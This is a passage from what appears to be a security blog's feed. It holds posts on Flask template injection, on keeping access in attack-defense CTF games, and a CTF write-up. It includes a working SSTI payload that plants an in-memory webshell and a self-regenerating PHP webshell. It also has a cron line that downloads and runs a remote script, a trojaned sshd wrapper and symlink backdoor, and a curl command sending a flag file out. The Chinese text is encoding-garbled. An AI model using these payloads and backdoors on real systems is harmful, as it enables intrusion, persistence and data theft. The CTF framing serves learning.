class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>In this demo , you can enter test directory and pass parameter â€˜nameâ€™ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains.</p><p>Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631714973234z6zu44pt.png?imageslim" alt="paste image"><br>This PoC shows that  SSTI vulnerability could execute system command in web page  which based on Flask.But the privilege inherited from the user who launched this application.</p><h1 id="Webshell-injection-in-Flask"><a href="#Webshell-injection-in-Flask" class="headerlink" title="Webshell injection in Flask"></a>Webshell injection in Flask</h1><p>There is a way to inject webshell into flask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.find the function which responsible for registering route</span><br><span class="line">2.pass paramaters to the function and improt os modules to execute system command</span><br><span class="line">3.expose an API to  execute user-defined system commandso </span><br><span class="line">so here is the Payload</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/1631718243223q0ni26nb.png?imageslim" alt="paste image"><br>Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami.</p><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>In this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Server-side Template Injection</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AWDæ–°æ‰‹çš„ä¸æ­»é©¬åŠæƒé™ç»´æŒæ€è·¯</title>
    <link href="https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
    <id>https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
    <published>2021-05-29T02:42:40.000Z</published>
    <updated>2021-05-29T04:08:31.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‚è€ƒé“¾æ¥<br><a href="https://jlkl.github.io/2019/02/08/Web_13/">https://jlkl.github.io/2019/02/08/Web_13/</a><br><a href="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/">https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/</a><br><a href="https://www.cnblogs.com/Cl0ud/p/13620537.html">https://www.cnblogs.com/Cl0ud/p/13620537.html</a><br><a href="https://zhuanlan.zhihu.com/p/88850561">https://zhuanlan.zhihu.com/p/88850561</a></p></blockquote><h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p>ä¸æ­»é©¬æŒ‡çš„æ˜¯å…¥åˆ°å†…å­˜çš„webshellï¼Œåœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ulinkåˆ é™¤è‡ªèº«æ–‡ä»¶å¹¶å¾ªç¯åˆ›å»ºwebshellã€‚</p><h1 id="ä¸æ­»é©¬åˆ©ç”¨æµç¨‹"><a href="#ä¸æ­»é©¬åˆ©ç”¨æµç¨‹" class="headerlink" title="ä¸æ­»é©¬åˆ©ç”¨æµç¨‹"></a>ä¸æ­»é©¬åˆ©ç”¨æµç¨‹</h1><p>é¦–å…ˆæ ¹æ®webåé—¨æˆ–è€…ä»»ä½•æŒ–æ˜å‡ºæ¥çš„æ¼æ´å°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚é—ç•™çš„webåé—¨ç­‰ï¼‰ï¼Œé€šè¿‡è¯¥ç±»æ¼æ´æˆåŠŸæ‰§è¡Œå†™å…¥ä¸æ­»é©¬çš„ç³»ç»Ÿå‘½ä»¤å¹¶æ‰§è¡Œè¯¥ä¸æ­»é©¬ã€‚æ¯”å¦‚é€šè¿‡å†…ç½®çš„åé—¨ç›´æ¥system(â€œecho ä¸æ­»é©¬è„šæœ¬å†…å®¹ &gt;/var/www/html;php ä¸æ­»é©¬æ–‡ä»¶å.phpâ€)ã€‚è¿™æ ·å°±ä¼šåœ¨è¯¥ç›®å½•ä¸‹ä¸æ–­ç”Ÿæˆä¸€ä¸ªä¸æ­»é©¬ æ¯”å¦‚.3.phpã€‚é€šè¿‡webshellç®¡ç†å·¥å…·æˆ–è€…ä½¿ç”¨Pythonå†™è„šæœ¬æ‰¹é‡è®¿é—®å»getflagã€‚</p><h1 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h1><p>è¿™é‡Œå·ä¸ªåˆ«çš„å¸ˆå‚…çš„å›¾å…ˆ<br><img src="http://cdn.polowong.top/1622256277454oiqbb65p.png?imageslim" alt="paste image">ä¸æ­»é©¬ä¸€èˆ¬é•¿è¿™æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);&#x2F;&#x2F;è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œè¿™é‡Œè®¾ç½®ä¸ºtrueåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file &#x3D; &#39;.3.php&#39;;</span><br><span class="line">    $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;</span><br><span class="line">    &#x2F;&#x2F;pass&#x3D;pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;);</span><br><span class="line"> Â  Â  Â  Â usleep(0);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¯¥ä¸æ­»é©¬ä¸æ–­ç”Ÿæˆ.3.phpï¼Œé€šè¿‡è®¿é—®<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a> Â ç„¶åPOST a=system(â€œæƒ³è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤â€);å³å¯é€šè¿‡ä¸æ­»é©¬å®ç°å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œä½¿ç”¨MD5æ˜¯å› ä¸ºé˜²æ­¢åˆ«äººéª‘ç€è‡ªå·±çš„é©¬è¿›å»äº†ï¼ŒMD5ç†è®ºä¸Šä¸å¯é€†ã€‚å¦‚æœä½¿ç”¨pythonæ‰¹é‡getshellçš„è¯å¤§ä½“æ€è·¯å°±æ˜¯</p><p>url=<a href="http://localhost/.3.php?pass=pass">http://localhost/.3.php?pass=pass</a><br>data={â€œaâ€:â€system(&quot;cat /flag&quot;);â€}<br>flag=requests.post(url=url,data=data).textç„¶åurlå˜å˜å°±å¯ä»¥ï¼Œä¸€èˆ¬ä¼šç»´æŠ¤ä¸€ä¸ªåœ°å€æ±  ä»åœ°å€æ± é‡Œé¢å–urlæˆ–è€…å–ç‰¹å¾ï¼ˆå¯èƒ½æŸä¸ªurlå­—æ®µä¸ä¸€æ ·ï¼‰ç›´æ¥æ‰“å°±è¡Œï¼Œå†é…åˆæäº¤flagçš„apiå°±å¯ä»¥å®ç°è‡ªåŠ¨getflagã€‚</p><h1 id="ä¸æ­»é©¬åˆ é™¤"><a href="#ä¸æ­»é©¬åˆ é™¤" class="headerlink" title="ä¸æ­»é©¬åˆ é™¤"></a>ä¸æ­»é©¬åˆ é™¤</h1><p>è¿™é‡Œä¸æ­»é©¬åˆ é™¤æœ‰å‡ ä¸ªæ€è·¯<br>1.shellè„šæœ¬ç›´æ¥åˆ é™¤ä¸æ­»é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while :</span><br><span class="line">do</span><br><span class="line">rm -rf .3.php;</span><br><span class="line">echo &quot;remove success&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å¯ä»¥æ›´å®Œå–„ä¸€äº›ï¼Œæ¯”å¦‚æŒ‚ä¸Šwhileè‡ªåŠ¨æ£€æµ‹æ–°å¢çš„æ–‡ä»¶ æˆ–è€…é…åˆæ–‡ä»¶ç›‘æ§è„šæœ¬å®ç°æ–°å¢ä¹‹åç›´æ¥è°ƒç”¨å‡½æ•°åˆ é™¤æ–°å¢çš„æ–‡ä»¶ç­‰ç­‰ï¼ˆPythonå®ç°ï¼Œæˆ‘ä¸ä¼šshellï¼‰<br>2.PHPæœåŠ¡é‡å¯ï¼ˆawdç¯å¢ƒå¯èƒ½ä¸å…è®¸ï¼Œå› ä¸ºæƒé™è¾ƒä½ï¼‰<br>service apache2 restart<br>service php restart</p><p>3.æ€ä½æƒé™PHPè¿›ç¨‹<br>php-apache:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br></pre></td></tr></table></figure><p>php-fpm:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="awdæƒé™ç»´æŒ"><a href="#awdæƒé™ç»´æŒ" class="headerlink" title="awdæƒé™ç»´æŒ"></a>awdæƒé™ç»´æŒ</h1><p>AWDçš„æƒé™ç»´æŒå…¶å®å’Œæ™®é€šçš„æƒé™ç»´æŒå·®ä¸å¤šå¸¸ç”¨çš„å¤§æ¦‚æœ‰ crontab sshè½¯è¿æ¥ sshwrapperã€‚<br>è¯¦æƒ…å‚è€ƒ<a href="https://xz.aliyun.com/t/7338%E7%BB%86%E7%9C%8B%E4%BA%86%E4%B8%8B%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://xz.aliyun.com/t/7338ç»†çœ‹äº†ä¸‹è¿™ç¯‡æ–‡ç« </a> å‘ç°äº†ä¸€ä¸ªéšè—ä¸€å¥è¯çš„æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?&#x3D;\&#96;\$_POST[cmd]\&#96;?&gt;\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php</span><br></pre></td></tr></table></figure><p>crontabæ·»åŠ è®¡åˆ’ä»»åŠ¡è‡ªåŠ¨å†™ä¸æ­»é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh</span><br></pre></td></tr></table></figure><p>æœ¬åœ°èµ·ä¸€ä¸ªhttpæœåŠ¡ æ”¾ä¸Šä¸€ä¸ªsh.shè„šæœ¬ï¼Œé‡Œé¢å†™äº†åˆ›å»ºphpä¸æ­»é©¬çš„å‘½ä»¤ã€‚<br>ä¸‹é¢ä¸¤ç§æš‚æ—¶åˆ©ç”¨å¤±è´¥ å¯èƒ½æ˜¯è…¾è®¯äº‘çš„åŸå› ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ssh wrapper</span><br><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">exp:</span><br><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line">sshè½¯è¿æ¥</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;</span><br><span class="line">å»ºç«‹ä¸€ä¸ªè½¯è¿æ¥ï¼Œç„¶åé€šè¿‡5555ç«¯å£è®¿é—®sshæœåŠ¡</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ“ä½œå°±æ˜¯curlå¤–å¸¦æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ,è¿™ä¸ªä¹Ÿå¯ä»¥å†™åˆ°crontabé‡Œé¢ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„ä½¿ç”¨æäº¤flagçš„apiæäº¤flagã€‚ç¤ºä¾‹å¦‚ä¸‹</p><p>curl â€œhttp://:7777?flag=$(cat /flag)â€</p><h1 id="ä¸€äº›å°æŠ€å·§"><a href="#ä¸€äº›å°æŠ€å·§" class="headerlink" title="ä¸€äº›å°æŠ€å·§"></a>ä¸€äº›å°æŠ€å·§</h1><p>ç”¨æ¥è¿·æƒ‘å¯¹æ‰‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;å‚è€ƒé“¾æ¥&lt;br&gt;&lt;a href=&quot;https://jlkl.github.io/2019/02/08/Web_13/&quot;&gt;https://jlkl.github.io/2019/02/08/Web_13/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å®‰ç½‘æ¯éƒ¨åˆ†wp</title>
    <link href="https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
    <id>https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</id>
    <published>2021-05-12T09:57:42.000Z</published>
    <updated>2021-05-14T15:54:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>webshellä¸Šä¼ </p><p>å‰ç«¯ç»•è¿‡ã€‚ç»•äº†åŠå¤©æ‰æƒ³èµ·æ¥æ˜¯å‰ç«¯ç»•è¿‡ã€‚ã€‚burpæ”¹ä¸ªåç¼€å°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç </span><br><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell èšå‰‘ä¸Šä¼  cat /flag</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><a href="http://172.20.2.4:9003/index.php?txt=../../../flag">http://172.20.2.4:9003/index.php?txt=../../../flag</a> ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç§’äº†</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>çŸ¥è¯†ç‚¹ï¼šSSTI,SSTIè¯»é…ç½®æ–‡ä»¶ï¼Œ/procç›®å½•çš„ä½œç”¨ï¼Œflask sessionä¼ªé€ </p><p>é¦–å…ˆï¼Œå°è¯•ç™»å½•172.20.2.3:9006,ç™»å½•å¤±è´¥ï¼Œè®¿é—®äº†ä¸€ä¸‹robots.txt,å‘ç°äº†æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè§‚å¯ŸURLï¼Œè€ƒè™‘å¯èƒ½å­˜åœ¨XSSï¼Œ</p><p>image-20210511155722690.png<img src="http://cdn.polowong.top/1620813539140l7b6j4e6.png?imageslim" alt="paste image"><br>è¿™é‡Œçœ‹äº†ä¸€çœ¼ä¸­é—´ä»¶åˆ†æç»“æœï¼Œå‘ç°äº†flaskã€‚ã€‚flaskäººç‹‚å–œï¼ˆã€‚</p><p>ç›´æ¥4</p><p>image-20210511155809022.png<img src="http://cdn.polowong.top/1620813548564ty2uanbr.png?imageslim" alt="paste image"><br>æ‡‚å¾—éƒ½æ‡‚ï¼Œé“sstiäº†ï¼Œå°è¯•ä¸€æ­¥æ­¥rceï¼Œæ£€æµ‹å‘ç°æ²¡å¼€debugæ¨¡å¼ï¼Œæ‰€ä»¥åªèƒ½èµ°å¸¸è§„çš„rceåˆ©ç”¨äº†ã€‚</p><p>å½“å°è¯•åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure><p>æ—¶å‘ç°è¢«banäº†ï¼Œå•ç‹¬æµ‹è¯•äº†ä¸‹å°æ‹¬å·ï¼Œå‘ç°æ˜¯banäº†å°æ‹¬å·ã€‚æ—¢ç„¶banäº†å°æ‹¬å·ï¼Œé‚£ä¹ˆå¸¸è§„çš„ssti rceåŸºæœ¬å°±èµ°ä¸é€šäº†ã€‚åªèƒ½è€ƒè™‘è¯»å–ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¯”å¦‚configï¼Œä½¿ç”¨payload  è¯»å–configæ–‡ä»¶ï¼Œå‘ç°äº† secret_key</p><p>image-20210511160014837.png<img src="http://cdn.polowong.top/16208135773438gjedayy.png?imageslim" alt="paste image"></p><p>secret_keyçš„ä½œç”¨æ˜¯ç”Ÿæˆsessionï¼Œå…·ä½“æ­¥éª¤æˆ‘å¿˜äº†ï¼Œåæ­£æ˜¯æ ¹æ®secret_keyå¯ä»¥è¿˜åŸå’Œç”Ÿæˆå¯¹åº”çš„sessionã€‚</p><p>githubæœ‰å¯¹åº”çš„å·¥å…·ï¼Œflask session managerã€‚</p><p>æ¥ä¸‹æ¥çœ‹äº†çœ‹æºç ï¼Œ<br>image-20210511160246157.png<img src="http://cdn.polowong.top/1620813563588zor9il2b.png?imageslim" alt="paste image"></p><p>ä¸€ä¸ªç®€å•çš„å‰ç«¯éªŒè¯ï¼ŒburpæŠ“è¿”å›åŒ…æŠŠ0æ”¹æˆ1å°±è¡Œï¼Œè¿™æ ·å°±é¡ºåˆ©è¿›å…¥åå°äº†ã€‚ä½†æ˜¯è¿›å…¥åå°åæç¤ºæˆ‘ä¸æ˜¯adminï¼ˆ2333</p><p>image-20210511160330889.png<img src="http://cdn.polowong.top/16208136016557e3ok72r.png?imageslim" alt="paste image"></p><p>å¥½å§ï¼Œçœ‹èµ·æ¥æ˜¯è¦ä¼ªé€ adminçš„sessionäº†ã€‚ç°åœ¨secret_keyæœ‰äº†ï¼Œç”¨å·¥å…·å…ˆè§£å¯†å½“å‰sessionï¼ŒæŠŠç”¨æˆ·åæ”¹æˆadminåå†ç”Ÿæˆsessionã€‚å¦‚ä¸‹å›¾æ‰€ç¤º</p><p>image-20210511160731351.png<img src="http://cdn.polowong.top/1620813610364ajp4gund.png?imageslim" alt="paste image"></p><p>é‚£ä¹ˆå½“å‰ç”Ÿæˆçš„adminçš„sessionå°±æ˜¯eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5oï¼Œedit this cookie æ¢ä¸€ä¸‹ï¼ˆæˆ‘è¿™chromeæœ‰bugï¼Œç”¨çš„firefoxï¼‰</p><p>image-20210511160841881.png<img src="http://cdn.polowong.top/16208136158740qcqf1gf.png?imageslim" alt="paste image"></p><p>å·²ç»ç»™äº†hintï¼Œè€ƒè™‘ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé¦–å…ˆå°è¯•è¯»å–/etc/passwdï¼ŒæˆåŠŸã€‚</p><p>image-20210511161046827.png<img src="http://cdn.polowong.top/16208136213232flk4by2.png?imageslim" alt="paste image"></p><p>æ¥ä¸‹æ¥å°è¯•è¯»flagã€‚ç›´æ¥/flagä¸è¡Œï¼Œå…³é”®å­—ç»™è¿‡æ»¤äº†ã€‚å¡äº†å¥½å‡ ä¸ªå°æ—¶</p><p>ç”¨äº†æŒºå¤šç»•è¿‡æ–¹æ³• /fla? /f* ç­‰ç­‰ ä½†æ˜¯å¯èƒ½ä¸­é—´æœ‰è½¬ä¹‰ä¹‹ç±»çš„ï¼Œæœ€ç»ˆä¼ åˆ°Linuxå±‚å¹¶ä¸èƒ½è¯†åˆ«é€šé…ç¬¦ï¼Œæ‰€ä»¥å¡äº†å¾ˆé•¿æ—¶é—´</p><p>æœ€åçš„æ€è·¯æ˜¯ä¹‹å‰æ¯”èµ›ä¸­è¯»flagï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼Œå¸ˆå‚…å‘Šè¯‰æˆ‘åˆ©ç”¨/proc/ç›®å½•è¯»æ–‡ä»¶ï¼Œprocç›®å½•ä»£è¡¨äº†ä¸å½“å‰è¿è¡Œè¿›ç¨‹æœ‰å…³çš„ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼ˆå­¦ä¹ é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/114594402%EF%BC%89%EF%BC%8C%E8%80%8C/proc/self%E7%9B%AE%E5%BD%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9C%89%E5%85%B3%E4%BF%A1%E6%81%AF%E5%B9%B6%E4%BB%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%B1%95%E7%A4%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%89fd%E3%80%81cmdline%E3%80%81cwd%E3%80%81envrion%E7%AD%89%E3%80%82">https://blog.csdn.net/qq_45521281/article/details/114594402ï¼‰ï¼Œè€Œ/proc/selfç›®å½•ä»£è¡¨äº†å½“å‰è¿›ç¨‹çš„æœ‰å…³ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼Œéœ€è¦æ³¨æ„çš„æœ‰fdã€cmdlineã€cwdã€envrionç­‰ã€‚</a></p><p>/proc/self/cmdline ä»£è¡¨å½“å‰çš„å‘½ä»¤è¡Œè¾“å…¥å†…å®¹ï¼Œæˆ‘è¯»å–äº†ä¹‹åæ˜¯è¿™ä¸ª</p><p>image-20210511161330178.png<img src="http://cdn.polowong.top/1620813626597i04733zp.png?imageslim" alt="paste image"></p><p>å¥½å®¶ä¼™ ç»å¯¹è·¯å¾„æœ‰äº†ï¼Œç›´æ¥è¯»æ–‡ä»¶</p><p>/app/app_a384gh1.py</p><p>ç¨‹åºä»£ç å¦‚ä¸‹ï¼ŒåŸºæœ¬ä¿®å¤äº†ssti-&gt;rceï¼Œç„¶åçœ‹åˆ°äº†import  ffffffff111llllag æ–‡ä»¶ï¼Œé‚£ç›´æ¥è¯»å½“å‰/appç›®å½•ä¸‹çš„ffffffff111llllag.pyå°±å¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 